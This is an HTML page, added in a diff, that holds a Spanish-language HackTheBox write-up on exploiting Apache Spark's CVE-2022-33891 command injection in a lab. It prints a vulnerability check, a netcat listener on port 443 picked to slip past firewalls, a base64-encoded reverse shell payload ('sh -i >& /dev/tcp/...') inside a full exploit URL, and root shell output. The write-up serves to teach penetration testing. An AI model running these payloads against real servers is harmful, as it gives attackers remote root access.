+          <strong>Tipo:</strong> OS Command Injection (CWE-78)<br>
+          <strong>Impacto:</strong> RCE como el usuario que ejecuta Spark (en este caso, root)<br>
+          <strong>Vector:</strong> La función de verificación de ACLs construye un comando shell usando directamente el parámetro <code>doAs</code> de la URL sin sanitización. Un atacante puede inyectar comandos arbitrarios a través de este parámetro.<br>
+          <strong>CVSS:</strong> 8.8 (Alto) — explotable remotamente sin autenticación previa.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- EXPLOTACIÓN -->
+    <div class="section" id="explotacion">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Explotación — CVE-2022-33891</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">CLONAR EL REPOSITORIO POC</span>
+      </div>
+      <div class="prose">
+        <p>
+          Descargamos el PoC (Proof of Concept) público de <strong>HuskyHacks</strong>
+          para CVE-2022-33891. Este script Python automatiza la explotación: construye
+          el payload en Base64, lo envía vía el parámetro <code style="color:var(--green)">doAs</code>
+          en la URL de Spark UI, y gestiona tanto la verificación de vulnerabilidad como
+          el establecimiento de la reverse shell.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="git clone https://github.com/HuskyHacks/cve-2022-33891.git">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">GIT</span>
+        <div><span class="prompt">$ </span><span class="cmd">git clone <span class="arg">https://github.com/HuskyHacks/cve-2022-33891.git</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Cloning into 'cve-2022-33891'...</div>
+        <div>remote: Enumerating objects: 69, done.</div>
+        <div>remote: Counting objects: 100% (69/69), done.</div>
+        <div>remote: Compressing objects: 100% (56/56), done.</div>
+        <div>remote: Total 69 (delta 22), reused 23 (delta 5), pack-reused 0 (from 0)</div>
+        <div>Receiving objects: 100% (69/69), 19.68 KiB | 19.68 MiB/s, done.</div>
+        <div><span class="o-green">Resolving deltas: 100% (22/22), done.</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">CREAR ENTORNO VIRTUAL E INSTALAR DEPENDENCIAS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Kali Linux 2024+ impide instalar paquetes Python directamente en el sistema con
+          <code style="color:var(--green)">pip install</code> para proteger la instalación del OS
+          (política PEP 668). La solución es crear un <strong>entorno virtual</strong> aislado,
+          instalar las dependencias ahí y activarlo antes de ejecutar el script.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd cve-2022-33891 && python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VENV</span>
+        <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">cve-2022-33891</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-m venv</span> <span class="arg">venv</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">source <span class="arg">venv/bin/activate</span></span></div>
+        <div><span class="prompt-venv">(venv) $ </span><span class="cmd">pip install <span class="flag">-r</span> <span class="arg">requirements.txt</span></span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ¿POR QUÉ EL ENTORNO VIRTUAL?</p>
+        <p>
+          Desde Kali 2024, <strong>pip install directo en el sistema está bloqueado</strong> por la política PEP 668.
+          El error <code>externally-managed-environment</code> te indica que el entorno Python está gestionado por el
+          gestor de paquetes del OS (apt). Instalar paquetes pip directamente podría romper dependencias del sistema.
+          La solución correcta: <strong>python3 -m venv venv</strong> crea un entorno Python aislado en la carpeta
+          <code>venv/</code>, con su propio pip y site-packages, sin tocar el sistema. Recuerda siempre activar
+          el entorno con <strong>source venv/bin/activate</strong> antes de usar el PoC.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">VERIFICAR LA VULNERABILIDAD CON --CHECK</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de lanzar la reverse shell, verificamos que el objetivo sea realmente
+          vulnerable. El flag <code style="color:var(--green)">--check</code> hace que el PoC
+          inyecte un <strong>sleep 10</strong>: si la respuesta tarda exactamente 10 segundos,
+          el servidor está ejecutando nuestro comando, confirmando RCE. La URL construida
+          internamente por el PoC es del tipo:
+          <code style="color:var(--green)">http://10.129.228.19:8080/?doAs=`echo [base64] | base64 -d | bash`</code>
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="python3 poc.py -u http://10.129.228.19 -p 8080 --check --verbose">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">POC</span>
+        <div><span class="prompt-venv">(venv) $ </span><span class="cmd">python3 poc.py <span class="flag">-u</span> <span class="arg">http://10.129.228.19</span> <span class="flag">-p</span> <span class="arg">8080</span> <span class="flag">--check</span> <span class="flag">--verbose</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[*] Attempting to connect to site...</div>
+        <div>[*] request: http://10.129.228.19:8080/?doAs=`testing`</div>
+        <div>[*] Response status code: 403</div>
+        <div>[*] Performing sleep test of 10 seconds...</div>
+        <div>[*] 2026-05-20 00:11:43.753466</div>
+        <div>[*] Command is: sleep 10</div>
+        <div>[*] Base64 command is: c2xlZXAgMTA=</div>
+        <div>[*] Full exploit request is: http://10.129.228.19:8080/?doAs=`echo c2xlZXAgMTA= | base64 -d | bash`</div>
+        <div>[*] Sending exploit...</div>
+        <div>[*] Response status code: 403</div>
+        <div>[*] Hint: 403 is good.</div>
+        <div>[*] 2026-05-20 00:11:54.143414</div>
+        <div>[*] Delta T: 10</div>
+        <div><span class="o-green">[!] Sleep was 10 seconds! This target is probably vulnerable!</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ RESPONDE 403?</p>
+        <p>
+          El código 403 (Forbidden) es la respuesta esperada y correcta. Spark UI devuelve
+          403 cuando el usuario no está autorizado — pero eso ocurre <strong>después</strong>
+          de ejecutar el código de verificación de ACLs. El comando inyectado se ejecuta
+          dentro de esa función de verificación, por lo que el 403 confirma que el flujo
+          vulnerable fue alcanzado. <strong>403 = la inyección llegó al punto vulnerable.</strong>
+          Si el servidor no fuera vulnerable, respondería de forma diferente o no habría retardo.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REVERSE SHELL -->
+    <div class="section" id="revshell">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Reverse Shell</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">ABRIR LISTENER CON NETCAT EN PUERTO 443</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de lanzar el exploit con la reverse shell, abrimos un listener
+          con <strong>netcat</strong> en el puerto 443. Usamos el puerto 443 porque es
+          el puerto estándar de HTTPS y con frecuencia está permitido en firewalls,
+          aumentando las posibilidades de que la conexión saliente del servidor llegue
+          a nuestra máquina sin ser bloqueada.
+        </p>
+        <p>
+          Este listener queda a la espera de una conexión entrante. Cuando el PoC
+          ejecute la reverse shell en el servidor, el servidor se conectará a nuestra
+          IP y puerto, y recibiremos la shell.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nc -lvnp 443">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NETCAT</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[sudo] password for kali:</div>
+        <div><span class="o-green">listening on [any] 443 ...</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// FLAGS DE NETCAT</p>
+        <p>
+          <strong>-l</strong> → Listen mode: netcat espera conexiones entrantes en lugar de iniciar una.<br>
+          <strong>-v</strong> → Verbose: muestra información sobre la conexión (IP origen, puerto).<br>
+          <strong>-n</strong> → Sin resolución DNS: no intenta resolver IPs a nombres de host.<br>
+          <strong>-p 443</strong> → Puerto de escucha. Requiere sudo porque los puertos por debajo de 1024 son privilegiados en Linux.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">LANZAR LA REVERSE SHELL CON EL POC</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el listener activo, ejecutamos el PoC con el flag
+          <code style="color:var(--green)">--revshell</code> especificando nuestra IP
+          (<code style="color:var(--green)">-lh</code>) y el puerto de escucha
+          (<code style="color:var(--green)">-lp</code>). El PoC construye el payload de
+          reverse shell, lo codifica en Base64 y lo inyecta en el parámetro
+          <code style="color:var(--green)">doAs</code> de Spark UI.
+        </p>
+        <p>
+          El comando inyectado internamente es del tipo:
+          <code style="color:var(--green)">sh -i >& /dev/tcp/10.10.16.5/443 0>&1</code>,
+          que redirige stdin/stdout/stderr del servidor a nuestra máquina a través de TCP,
+          dándonos una shell interactiva.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="python3 poc.py -u http://10.129.228.19 -p 8080 --revshell -lh 10.10.16.5 -lp 443 --verbose">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">REVSHELL</span>
+        <div><span class="prompt-venv">(venv) $ </span><span class="cmd">python3 poc.py <span class="flag">-u</span> <span class="arg">http://10.129.228.19</span> <span class="flag">-p</span> <span class="arg">8080</span> <span class="flag">--revshell</span> <span class="flag">-lh</span> <span class="arg">10.10.16.5</span> <span class="flag">-lp</span> <span class="arg">443</span> <span class="flag">--verbose</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[*] Reverse shell mode.</div>
+        <div>[*] Set up your listener by entering the following:</div>
+        <div>[*] nc -nvlp 443</div>
+        <div>[*] When your listener is set up, press enter!</div>
+        <div>[*] Command is: sh -i >& /dev/tcp/10.10.16.5/443 0>&1</div>
+        <div>[*] Base64 command is: c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNS80NDMgMD4mMQ==</div>
+        <div>[*] Full exploit request is: http://10.129.228.19:8080/?doAs=`echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNS80NDMgMD4mMQ== | base64 -d | bash`</div>
+        <div>[*] Sending exploit...</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FLAG -->
+    <div class="section" id="flag">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Flag</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">OBTENCIÓN DE LA FLAG COMO ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          En el terminal donde tenemos el listener de netcat, recibimos la conexión
+          del servidor. El prompt <code style="color:var(--green)">#</code> y el resultado
+          de <code style="color:var(--green)">whoami</code> confirman que somos
+          <span class="hl">root</span>: Apache Spark estaba corriendo con el usuario más
+          privilegiado del sistema, y la inyección de comandos nos dio acceso directo
+          con esos privilegios.
+        </p>
+        <p>
+          El archivo <code style="color:var(--green)">flag.txt</code> se encuentra
+          en el directorio home de root (<code style="color:var(--green)">/root/</code>).
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">connect to [10.10.16.5] from (UNKNOWN) [10.129.228.19] 40512</span></div>
+        <div>sh: 0: can't access tty; job control turned off</div>
+        <div><span class="o-green"># whoami</span></div>
+        <div><span class="o-green">root</span></div>
+        <div><span class="o-green"># ls -la</span></div>
+        <div>total 36</div>
+        <div>drwx------&nbsp; 6 root root 4096 Aug 4 2022 .</div>
+        <div>drwxr-xr-x 20 root root 4096 Aug 4 2022 ..</div>
+        <div>-r--------&nbsp; 1 root root&nbsp;&nbsp; 33 Aug 3 2022 <span class="o-green">flag.txt</span></div>
+        <div>drwxr-xr-x&nbsp; 3 root root 4096 Aug 4 2022 .local</div>
+        <div>drwx------&nbsp; 2 root root 4096 Aug 4 2022 .ssh</div>
+        <div><span class="o-green"># cat flag.txt</span></div>
+        <div><span class="o-green">f8492d7f24b1f4c9505278382091a330</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ SOMOS ROOT?</p>
+        <p>
+          Apache Spark fue iniciado por el usuario <strong>root</strong> en esta máquina.
+          Cualquier proceso hijo que Spark genere heredará los permisos de root. Al inyectar
+          un comando a través de CVE-2022-33891, ese comando se ejecuta en el contexto del
+          proceso Spark, es decir, como root. En entornos de producción reales, Spark
+          <strong>nunca debería ejecutarse como root</strong> — debería tener su propio
+          usuario de servicio con privilegios mínimos. Este es un error de configuración
+          adicional que agrava la severidad de la vulnerabilidad.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ping</div>
+          <div class="cmd-ref-syntax">ping &lt;IP&gt; -c &lt;N&gt;</div>
+          <div class="cmd-ref-desc">Verifica conectividad con el host y determina el OS por el TTL de respuesta.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-c N</span> → Envía N paquetes ICMP y para. Sin -c, ping corre indefinidamente.</li>
+            <li><span>TTL ≈ 64</span> → Linux/Unix (TTL inicial 64 menos hops).</li>
+            <li><span>TTL ≈ 128</span> → Windows (TTL inicial 128 menos hops).</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX out.xml</div>
+          <div class="cmd-ref-desc">Escaneo exhaustivo de todos los puertos TCP con detección de versiones y scripts NSE.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → Todos los 65,535 puertos TCP.</li>
+            <li><span>-sS</span> → SYN scan, requiere sudo.</li>
+            <li><span>-sC -sV</span> → Scripts NSE + detección de versiones.</li>
+            <li><span>-oX</span> → Exportar a XML para xsltproc.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc /usr/share/nmap/nmap.xsl scan.xml > scan.html</div>
+          <div class="cmd-ref-desc">Transforma el XML de nmap en una tabla HTML navegable para documentación.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>nmap.xsl</span> → Hoja de estilos incluida en Kali con nmap.</li>
+            <li><span>&gt; file.html</span> → Redirige el output al archivo HTML.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">python3 -m venv</div>
+          <div class="cmd-ref-syntax">python3 -m venv venv && source venv/bin/activate</div>
+          <div class="cmd-ref-desc">Crea y activa un entorno virtual Python aislado. Obligatorio en Kali 2024+ para pip install.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-m venv</span> → Módulo de Python para entornos virtuales.</li>
+            <li><span>source activate</span> → Activa el entorno (cambia el PATH a venv/bin/).</li>
+            <li><span>deactivate</span> → Desactiva el entorno virtual.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">poc.py --check</div>
+          <div class="cmd-ref-syntax">python3 poc.py -u &lt;URL&gt; -p &lt;PORT&gt; --check --verbose</div>
+          <div class="cmd-ref-desc">Verifica si el target es vulnerable inyectando un sleep 10. Si tarda 10s, hay RCE.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-u</span> → URL base del target (sin puerto).</li>
+            <li><span>-p</span> → Puerto de Spark UI.</li>
+            <li><span>--check</span> → Modo verificación con sleep 10.</li>
+            <li><span>--verbose</span> → Muestra el payload y la URL completa.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">poc.py --revshell</div>
+          <div class="cmd-ref-syntax">python3 poc.py -u &lt;URL&gt; -p &lt;PORT&gt; --revshell -lh &lt;IP&gt; -lp &lt;PORT&gt;</div>
+          <div class="cmd-ref-desc">Inyecta un payload de reverse shell que conecta al listener de netcat.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>--revshell</span> → Modo reverse shell.</li>
+            <li><span>-lh</span> → IP local (nuestra VPN tun0).</li>
+            <li><span>-lp</span> → Puerto local donde escucha nc.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">netcat (nc)</div>
+          <div class="cmd-ref-syntax">sudo nc -lvnp &lt;PORT&gt;</div>
+          <div class="cmd-ref-desc">Listener TCP que espera la conexión entrante de la reverse shell.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> → Modo escucha (listener).</li>
+            <li><span>-v</span> → Verbose: muestra IP y puerto del cliente.</li>
+            <li><span>-n</span> → Sin resolución DNS.</li>
+            <li><span>-p</span> → Puerto de escucha. Puerto 443 para evadir firewalls.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">git clone</div>
+          <div class="cmd-ref-syntax">git clone &lt;URL_REPO&gt;</div>
+          <div class="cmd-ref-desc">Descarga el repositorio del PoC. Requiere conectividad a internet desde Kali.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>--depth 1</span> → Clonar solo el último commit (más rápido).</li>
+            <li><span>-b &lt;branch&gt;</span> → Clonar una rama específica.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">Apache Spark — Motor de Análisis Distribuido</div>
+          <div class="glos-def"><strong>Apache Spark</strong> es un framework open-source de procesamiento de datos distribuido, diseñado para análisis de Big Data a gran velocidad en memoria. Su arquitectura es maestro-esclavo: el <strong>Spark Master</strong> (puerto 8080) coordina el cluster y distribuye tareas; los <strong>Spark Workers</strong> (puerto 8081) ejecutan las tareas. Las aplicaciones se envían como <strong>Jobs</strong> a través de la API REST o la UI web. En entornos productivos, Spark se despliega en clusters Hadoop o Kubernetes; en esta máquina corre en modo standalone. La <strong>Spark UI</strong> es la interfaz web que muestra el estado del cluster, los jobs en ejecución y los logs — y es el vector de ataque de CVE-2022-33891.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2022-33891 — OS Command Injection en Spark UI</div>
+          <div class="glos-def"><strong>CVE-2022-33891</strong> es una vulnerabilidad de inyección de comandos OS (CWE-78) en la interfaz web de Apache Spark (versiones ≤ 3.0.3, ≤ 3.1.2, ≤ 3.2.1). Cuando <code>spark.acls.enable=true</code>, la función <code>checkUIViewPermissions</code> construye un comando shell usando directamente el parámetro <code>doAs</code> de la URL sin sanitización. El parámetro se pasa como argumento al binario de verificación de permisos, pero al estar sin escapar, un atacante puede usar backticks (`` ` ``) para inyectar comandos arbitrarios. El servidor ejecuta el payload en el contexto del proceso Spark. Publicado el 5 de julio de 2022 por Kostya Kortchinsky. Parcheado en Spark 3.0.4, 3.1.3, 3.2.2 y 3.3.0.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">OS Command Injection (CWE-78)</div>
+          <div class="glos-def"><strong>OS Command Injection</strong> ocurre cuando una aplicación construye comandos del sistema operativo usando datos controlados por el atacante sin sanitización adecuada. El atacante puede incluir metacaracteres de shell (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, `` ` ``) para encadenar comandos adicionales. En CVE-2022-33891, la inyección se realiza con backticks en el parámetro <code>doAs</code>: la URL <code>/?doAs=`comando`</code> hace que el shell evalúe el contenido entre backticks antes de pasarlo como argumento al binario de verificación. Para evadir WAFs y caracteres especiales, el PoC codifica el payload en <strong>Base64</strong> y lo decodifica en tiempo de ejecución: <code>echo [base64] | base64 -d | bash</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell — Conexión Inversa</div>
+          <div class="glos-def">Una <strong>reverse shell</strong> es una técnica donde la máquina víctima inicia la conexión hacia el atacante (en lugar del esquema habitual donde el atacante se conecta a la víctima). Esto es necesario porque los firewalls suelen bloquear conexiones entrantes al servidor pero permiten las salientes. El flujo es: (1) el atacante abre un listener con <code>nc -lvnp [puerto]</code>; (2) se inyecta el payload en el servidor (<code>sh -i >& /dev/tcp/[IP]/[PORT] 0>&1</code>); (3) el servidor abre una conexión TCP hacia el atacante y redirige su stdin/stdout/stderr a esa conexión; (4) el atacante recibe la shell. El uso del puerto 443 imita tráfico HTTPS saliente, reduciendo la probabilidad de que el firewall lo bloquee.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Jetty — Servidor Web Embebido de Java</div>
+          <div class="glos-def"><strong>Eclipse Jetty</strong> es un servidor web y contenedor de servlets Java ligero, diseñado para ser embebido en aplicaciones Java. Apache Spark usa Jetty para servir su interfaz web (Spark UI) y sus endpoints REST. A diferencia de Tomcat o servidores web independientes, Jetty corre dentro del proceso JVM de Spark, por lo que hereda directamente los permisos del proceso Spark. En el escaneo nmap, el <code>http-server-header: Jetty(9.4.40.v20210413)</code> revela tanto el servidor web como su versión, útil para buscar vulnerabilidades adicionales. Jetty 9.4.x es la serie LTS compatible con Java 8 y 11.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Entorno Virtual Python (venv) en Kali 2024+</div>
+          <div class="glos-def">Desde Kali Linux 2024, el sistema Python está marcado como <strong>externally-managed</strong> (PEP 668). Esto impide que <code>pip install</code> instale paquetes directamente en el sistema para evitar conflictos con los paquetes gestionados por <code>apt</code>. La solución es usar <strong>python3 -m venv</strong> para crear un entorno virtual aislado: una copia del intérprete Python con su propio directorio <code>site-packages</code> independiente del sistema. Al activar el entorno con <code>source venv/bin/activate</code>, el PATH prioriza <code>venv/bin/</code>, por lo que <code>python</code> y <code>pip</code> apuntan al entorno aislado. Los paquetes instalados ahí no afectan al sistema. Alternativas: <code>pip install --break-system-packages</code> (no recomendado) o <code>pipx</code> para aplicaciones.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Base64 Encoding en Payloads de Shell</div>
+          <div class="glos-def">La codificación <strong>Base64</strong> se usa frecuentemente en payloads de explotación para evitar problemas con caracteres especiales en URLs, firewalls o WAFs que inspeccionan el tráfico HTTP. En CVE-2022-33891, el payload de reverse shell (<code>sh -i >& /dev/tcp/IP/PORT 0>&1</code>) contiene caracteres como <code>/</code>, <code>&gt;</code>, <code>&amp;</code> y espacios que podrían interferir con el parsing de la URL o ser filtrados. Al codificarlo en Base64 y decodificarlo en tiempo de ejecución (<code>echo [b64] | base64 -d | bash</code>), se transmite una cadena alfanumérica segura que el servidor decodifica y ejecuta localmente, evadiendo los filtros de caracteres especiales en la URL.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // TOC ACTIVE
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObs.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const scrolled = document.documentElement.scrollTop;
+    const height   = document.documentElement.scrollHeight - window.innerHeight;
+    const pct = height > 0 ? (scrolled / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = pct + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) { toast = document.createElement('div'); toast.className = 'toast'; document.body.appendChild(toast); }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY CMD
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK'; btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
+    }).catch(() => showToast('Error al copiar'));
+  }
+</script>
+</body>
+</html>
